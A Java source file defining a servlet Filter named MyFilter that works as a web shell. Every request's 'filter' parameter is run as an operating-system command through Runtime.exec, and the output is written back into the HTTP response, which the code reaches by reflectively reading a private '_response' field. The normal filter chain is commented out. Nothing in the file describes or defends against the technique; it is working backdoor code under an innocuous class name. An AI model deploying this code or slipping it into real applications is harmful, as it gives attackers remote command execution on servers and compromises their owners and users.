package com.axisx;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class MyFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest)servletRequest;
        HttpServletResponse resp = null;

        try {
            resp = this.getResponseFromRequest(req);
            String cmd = req.getParameter("filter");
            String result = this.CommandExec(cmd);
            resp.getWriter().println(result);
        } catch (Exception var8) {
            var8.printStackTrace();
        }
//        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("Filter 销毁！");
    }

    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) throws IllegalAccessException {
        HttpServletResponse var2 = null;
        Field var3 = null;
        try {
            var3 = var1.getClass().getDeclaredField("_response");
        } catch (Exception var8) {
            try {
                var3=var1.getClass().getSuperclass().getDeclaredField("_response");
            } catch (Exception var7) {
            }
        }
        var3.setAccessible(true);
        var2 = (HttpServletResponse)var3.get(var1);

        return var2;
    }
}
